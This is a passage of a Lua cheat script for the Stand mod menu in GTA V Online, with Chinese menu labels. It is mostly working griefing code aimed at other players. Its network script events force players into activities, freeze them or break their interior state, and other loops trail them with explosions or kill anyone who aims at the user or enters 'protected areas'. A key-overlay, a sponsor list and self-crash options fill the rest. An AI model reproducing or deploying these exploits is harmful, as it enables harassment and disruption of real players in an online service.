        util.trigger_script_event(1 << pid, {-95341040, players.user(), 194, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    
    menu.action(cayoperico, "强制1V1", {"1v1"}, "", function()
        if StandUser(pid) then util.toast(stand_notif) return end
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 197, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(cayoperico, "破坏室内状态", {}, "可以通过重新加入战局来取消。玩家必须在一个公寓里。适用于大多数菜单.", function()
        if StandUser(pid) then util.toast(stand_notif) return end
        if players.is_in_interior(pid) then
            util.trigger_script_event(1 << pid, {629813291, players.user(), pid, pid, pid, math.random(int_min, int_max), pid})
        else
            util.toast(players.get_name(pid) .. " isn't in an interior. :/")
        end
    end)

    local freeze = menu.list(antimodder, "冻结", {}, "")
    player_toggle_loop(freeze, pid, "暴力冻结", {"violentfreeze"}, "", function()
        util.trigger_script_event(1 << pid, {330622597, pid, 0, 0, 0, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, pid, "仓库冻结", {"warehousefreeze"}, "", function()
        util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, pid, "模型冻结", {"modelfreeze"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end)

    menu.toggle_loop(jindianegao, "足迹追踪", {走到哪都有痕迹}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        util.yield(65)
    end)

	menu.toggle_loop(friendly, "送他一把爆炸枪", {""}, "绿玩从此成为挂b", function ()
        local pped = PLAYER.GET_PLAYER_PED(pid)
        local impactCoord = v3.new()
        local shot = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(pped, impactCoord)
        if shot then
            local explo = {x = v3.getX(impactCoord), y = v3.getY(impactCoord), z = v3.getZ(impactCoord)}
            local explo = GetTableFromV3Instance(impactCoord)
            SE_add_owned_explosion(pped, explo.x, explo.y, explo.z, 2, 10, true,false, 0)
        end
        v3.free(impactCoord)
    end)
end	

players.on_join(playerActionsSetup)
players.dispatch_on_join()
local x, y = directx.get_client_size()
local ratio = x/y
local run = false

local wasdww = menu.list(other_options, '按键显示', {''}, '')
menu.toggle(wasdww, '打开', {''}, '', function(on) 
	run = on
end, false)
menu.slider(wasdww, 'X轴', {''}, '',1 , 10000, overlay_x * 10000, 20, function(value)
	overlay_x = value / 10000
end)
menu.slider(wasdww, 'Y轴', {''}, '',1 , 10000, overlay_y * 10000, 20, function(value)
	overlay_y = value / 10000
end)
menu.slider(wasdww, '大小', {''}, '',1 , 10000, 300, 20, function(value)
	size = value / 10000
    boxMargin = size / 7
end)

local color_root = menu.list(wasdww, '颜色', {''}, '')
menu.colour(color_root, '文本颜色', {'co'}, '', key_text_color, true, function(colour)
    key_text_color = colour
end)
menu.colour(color_root, '背景颜色', {'bg-color'}, '', background_colour, true, function(colour)
    background_colour = colour
end)
menu.rainbow(menu.colour(color_root, '按键反馈颜色', {'press-color'}, '', pressed_background_colour, true, function(colour)
    pressed_background_colour = colour
end))


local hide_root = menu.list(wasdww, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end


util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
if safeMonitorToggle then
    local ct = 0
    local spacing = 0.015 + smSettings.scale * smSettings.scale / 50
    for i = 1, #JS_tbls.safeManagerToggles do
        if JS_tbls.safeManagerToggles[i].toggle then
            ct += spacing
            directx.draw_text(1 + smSettings.xOffset / 200, ct + smSettings.yOffset / 200, JS_tbls.safeManagerToggles[i].displayText(), smSettings.alignment, smSettings.scale, smSettings.textColour, false)
        end
    end
end
end)

local sponsor = menu.list(other_options, '功德簿', {}, '')

menu.action(sponsor, '清欢', {}, '', function ()
end)
menu.action(sponsor, '12', {}, '', function ()
end)
menu.action(sponsor, 'sjr', {}, '', function ()
end)
menu.action(sponsor, '柒月', {}, '', function ()
end)
menu.action(sponsor, 'GAI', {}, '', function ()
end)
menu.action(sponsor, '庸人自扰', {}, '', function ()
end)
menu.action(sponsor, '某时某刻', {}, '', function ()
end)
menu.action(sponsor, 'QIDMxc1111小马哥', {}, '', function ()
end)
menu.action(sponsor, 'Super飞', {}, '', function ()
end)
menu.action(sponsor, '全副战神', {}, '', function ()
end)
menu.action(sponsor, '好雨知时节', {}, '', function ()
end)
menu.action(sponsor, 'YYQQ', {}, '', function ()
end)
menu.action(sponsor, '西海', {}, '', function ()
end)
menu.action(sponsor, '点儿', {}, '', function ()
end)
menu.action(sponsor, 'Anson⁶6⁶6⁶6⁶', {}, '', function ()
end)
menu.action(sponsor, '為所欲為', {}, '', function ()
end)
menu.action(sponsor, 'N', {}, '', function ()
end)
menu.action(sponsor, 'Roll the coarse', {}, '', function ()
end)
menu.action(sponsor, '等天黑', {}, '', function ()
end)
menu.action(sponsor, '小维', {}, '', function ()
end)
menu.action(sponsor, 'longsir666', {}, '', function ()
end)
menu.action(sponsor, '猛女丢丢', {}, '', function ()
end)
menu.action(sponsor, 'cheng', {}, '', function ()
end)
menu.action(sponsor, '不困', {}, '', function ()
end)
menu.action(sponsor, 'zssf', {}, '', function ()
end)
menu.action(sponsor, '南山先生', {}, '', function ()
end)
menu.action(sponsor, '狼烟4起', {}, '', function ()
end)
menu.action(sponsor, '汤姆', {}, '', function ()
end)
menu.action(sponsor, '禧冬', {}, '', function ()
end)
menu.action(sponsor, '西木', {}, '', function ()
end)
menu.action(sponsor, 'C', {}, '', function ()
end)
menu.action(sponsor, 'ikun', {}, '', function ()
end)
menu.action(sponsor, 'Asuka02', {}, '', function ()
end)

menu.hyperlink(other_options, "GTlua群", "https://jq.qq.com/?_wv=1027&k=TyOStL4T", "欢迎进入提意见")

menu.action(other_options, "重新启动GTAV", {""}, "", function(on_click)
    MISC._RESTART_GAME()
end)

	menu.click_slider(other_options, "自崩", {"Crash me"}, "1 = yeet, 2 = conecrash", 1, 2, 1, 1, function(on_change)
	if on_change == 1 then	
	menu.trigger_commands("yeet")
	end
	if on_change == 2 then

    STREAMING.REQUEST_MODEL(-1364166376)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(-1364166376, c.x, c.y, c.z, true, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cone, cone, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
	end
end)

menu.action(other_options, "迷惑", {}, "我也不知道会发生什么", function()
    if randomizer(array) == "1" then
        notification("你的游戏幸存了下来")
    else
        notification("看起来你的游戏崩了")
    util.yield(3000)
        ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end
end)

menu.action(other_options,"关闭脚本",{},"",function ()
    util.stop_script()
end)
util.yield(100)

util.on_stop(function()
	if UFO.exists() then
		UFO.destroy()
	end

	if GuidedMissile.exists() then
		GuidedMissile.destroy()
	end
    Ini.save(configFile, Config)
end)

if do_autoload then
    load_loadout:trigger()
end

local last_car = 0
while true do
    player_cur_car = entities.get_user_vehicle_as_handle()
    if last_car ~= player_cur_car and player_cur_car ~= 0 then 
        on_user_change_vehicle(player_cur_car)
        last_car = player_cur_car
    end

    if renderscorched then
        if player_cur_car ~= 0 then
            ENTITY.SET_ENTITY_RENDER_SCORCHED(player_cur_car, true)
        end
    end

    if mph_plate then
        if player_cur_car ~= 0 then
            if mph_unit == "KPH" then
                unit_conv = 3.6
            else
                unit_conv = 2.236936
            end
            speed = math.ceil(ENTITY.GET_ENTITY_SPEED(player_cur_car)*unit_conv)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car, speed .. " " .. mph_unit)
        end
    end

    if walkonwater or driveonwater or driveonair then
        if dow_block == 0 or not ENTITY.DOES_ENTITY_EXIST(dow_block) then
            local hash = util.joaat("stt_prop_stunt_bblock_mdm3")
            request_model_load(hash)
            local c = {}
            c.x = 0.0
            c.y = 0.0
            c.z = 0.0
            dow_block = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, c['x'], c['y'], c['z'], true, false, false)
            ENTITY.SET_ENTITY_ALPHA(dow_block, 0)
            ENTITY.SET_ENTITY_VISIBLE(dow_block, false, 0)
        end
    end

    if dow_block ~= 0 and not walkonwater and not walkonair and not driveonwater and not driveonair then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
    end

    if walkonwater then
        vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 2.0, 0.0)
        -- we need to offset this because otherwise the player keeps diving off the thing, like a fucking dumbass
        -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
        local ht = memory.alloc(4)
        -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
        if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
            ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        end
    end

    if driveonwater then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
            local ht = memory.alloc(4)
            -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
            if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
        else
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end

        if aim_info then
        local info = get_aim_info()
        if info['ent'] ~= 0 then
            local text = "哈希: " .. info['hash'] .. "\n实体: " .. info['ent'] .. "\n生命值: " .. info['health'] .. "\n类型: " .. info['type'] .. "\n速度: " .. info['speed']
            directx.draw_text(0.5, 0.3, text, 5, 0.5, to_rgb(1.0,1.0,1.0,1.0), true)
        end
    end

    if grapplegun then
        local curwep = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
        if PED.IS_PED_SHOOTING(players.user_ped()) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) then
            if curwep == util.joaat("weapon_pistol") or curwep == util.joaat("weapon_pistol_mk2") then
                local raycast_coord = raycast_gameplay_cam_gun(-1, 10000.0)
                if raycast_coord[1] == 1 then
                    local lastdist = nil
                    TASK.TASK_SKY_DIVE(players.user_ped())
                    while true do
                        if PAD.IS_CONTROL_JUST_PRESSED(45, 45) then 
                            break
                        end
                        if raycast_coord[4] ~= 0 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) >= 1 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) < 3 then
                            ggc1 = ENTITY.GET_ENTITY_COORDS(raycast_coord[4], true)
                        else
                            ggc1 = raycast_coord[2]
                        end

                        local c2 = players.get_position(players.user())
                        local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(ggc1['x'], ggc1['y'], ggc1['z'], c2['x'], c2['y'], c2['z'], true)
                        -- safety
                        if not lastdist or dist < lastdist then 
                            lastdist = dist
                        else
                            break
                        end
                        if ENTITY.IS_ENTITY_DEAD(players.user_ped()) then
                            break
                        end
                        if dist >= 10 then
                            local dir = {}
                            dir['x'] = (ggc1['x'] - c2['x']) * dist
                            dir['y'] = (ggc1['y'] - c2['y']) * dist
                            dir['z'] = (ggc1['z'] - c2['z']) * dist
                            --ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 2, dir['x'], dir['y'], dir['z'], 0.0, 0.0, 0.0, 0, false, false, true, false, true)
                            ENTITY.SET_ENTITY_VELOCITY(players.user_ped(), dir['x'], dir['y'], dir['z'])
                        else
                            local t = ENTITY.GET_ENTITY_TYPE(raycast_coord[4])
                            if t == 2 then
                                set_player_into_suitable_seat(raycast_coord[4])
                            elseif t == 1 then
                                local v = PED.GET_VEHICLE_PED_IS_IN(t, false)
                                if v ~= 0 then
                                    set_player_into_suitable_seat(v)
                                end
                            end
                            break
                        end
                        util.yield()
                    end
                end
            end
        end
    end


    if paintball then
        local ent = get_aim_info()['ent']
        request_control_of_entity(ent)
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                rand = {}
                rand['r'] = math.random(100,255)
                rand['g'] = math.random(100,255)
                rand['b'] = math.random(100,255)
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(ent, rand['r'], rand['g'], rand['b'])
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(ent, rand['r'], rand['g'], rand['b'])
            end
        end
    end

    if driveonair then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            local boxpos = ENTITY.GET_ENTITY_COORDS(dow_block, true)
            if MISC.GET_DISTANCE_BETWEEN_COORDS(pos['x'], pos['y'], pos['z'], boxpos['x'], boxpos['y'], boxpos['z'], true) >= 5 then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
            if PAD.IS_CONTROL_PRESSED(22, 22) then
                doa_ht = doa_ht + 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
            if PAD.IS_CONTROL_PRESSED(36, 36) then
                doa_ht = doa_ht - 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
        end
    end

    if gun_stealer then
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local ent = get_aim_info()['ent']
            if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if PED.IS_PED_A_PLAYER(driver) then
                    hijack_veh_for_player(ent)
                end
                request_control_of_entity(ent)
                set_player_into_suitable_seat(ent)
            end
        end
    end

    if tesla_ped ~= 0 then
        lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
        p_coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        t_coords = ENTITY.GET_ENTITY_COORDS(lastcar, true)
        dist = MISC.GET_DISTANCE_BETWEEN_COORDS(p_coords['x'], p_coords['y'], p_coords['z'], t_coords['x'], t_coords['y'], t_coords['z'], false)
        if lastcar == 0 or ENTITY.GET_ENTITY_HEALTH(lastcar) == 0 or dist <= 5 then
            entities.delete_by_handle(tesla_ped)
            VEHICLE.BRING_VEHICLE_TO_HALT(lastcar, 5.0, 2, true)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(lastcar, false)
            VEHICLE.START_VEHICLE_HORN(lastcar, 1000, util.joaat("NORMAL"), false)
            tesla_ped = 0
            util.remove_blip(tesla_blip)
        end
    end
    GuidedMissile.mainLoop()
    UFO.mainLoop()
    bodyguardMenu:onTick()
    util.yield()
end

players_thread = util.create_thread(function (thr)
    while true do
        if player_uses > 0 then
            if show_updates then
                notify("Player pool is being updated")
            end
            all_players = players.list(true, true, true)
            for k,pid in pairs(all_players) do
                if anti_aim then 
                    local c1 = players.get_position(pid)
                    local c2 =  players.get_position(players.user())
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    if PED.IS_PED_FACING_PED(ped, players.user_ped(), anti_aim_angle) 
                        and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17)
                            and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000 
                                and WEAPON.GET_SELECTED_PED_WEAPON(ped) ~= -1569615261 
                                    and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then
                        pluto_switch anti_aim_type do 
                            case 1: 
                                util.trigger_script_event(1 << pid, {-1388926377, 4, -1762807505, 0})
                                break
                            case 2: 
                                local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0, 0.0, 2.8)
                                FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 70, 100.0, false, true, 0.0)
                                break
                            case 3:
                                menu.trigger_commands("kill " .. players.get_name(pid))
                                break
                        end
                        if anti_aim_notify then
                            notify(players.get_name(pid) .. translations.is_aiming_at_you)
                        end
                    end
                end

                if bigbarrelqq then
                    if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
                    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                end
            end

                if protected_areas_on then
                    for k,v in pairs(protected_areas) do
                        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
                        local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(c.x, c.y, c.z, v.x, v.y, v.z, true)
                        if dist < v.radius then
                            local hdl = pid_to_handle(pid)
                            local rid = players.get_rockstar_id(pid)
                            kill_this_guy = true
                            if protected_area_allow_friends then
                                if NETWORK.NETWORK_IS_FRIEND(hdl) then
                                    kill_this_guy = false
                                end
                            end
                            if protected_area_kill_armed then
                                -- default to false
                                kill_this_guy = false
                                if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) ~= -1569615261 then
                                    kill_this_guy = true
                                end
                            end
                            if kill_this_guy then
                                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(c.x, c.y, c.z, c.x, c.y, c.z+0.1, 300.0, true, 100416529, players.user_ped(), true, false, 100.0)
                            end
                        end
                    end
                end
            end
        end
        util.yield()
    end
end)

util.on_stop(function()

	if OrbitalCannon.exists() then
		OrbitalCannon.destroy()
	end
    if ENTITY.DOES_ENTITY_EXIST(selfSpeechPed.entity) then
        entities.delete(selfSpeechPed.entity)
    end
    ANIMATIONS = {}
    if animLoaded then
        util.toast("警告:卸载动画浏览列表，将会卡顿.")
        destroy_animations_data()
    end
    delete_anim_props()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    if not PED.IS_PED_IN_ANY_VEHICLE(my_ped) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(my_ped)
    end
end)

while true do
    if selfSpeechPed.entity > 0 and os.millis() - selfSpeechPed.lastUsed > 20 then
        if ENTITY.DOES_ENTITY_EXIST(selfSpeechPed.entity) then
            entities.delete(selfSpeechPed.entity)
        end
        selfSpeechPed.entity = 0
    end
	util.yield()
end

while true do
    if NETWORK.NETWORK_IS_IN_SESSION() == false then
        while NETWORK.NETWORK_IS_IN_SESSION() == false or util.is_session_transition_active() do
            util.yield(1000)
        end
        util.yield(1000)
		spawnpos = players.get_position(players.user())
        repeat
            local pos = players.get_position(players.user())
            util.yield(500)
        until spawnpos.x ~= pos.x and spawnpos.y ~= pos.y
        if do_autoload then
            load_loadout:trigger()
        else
            regen_menu()
        end
    end
    util.yield(100)
end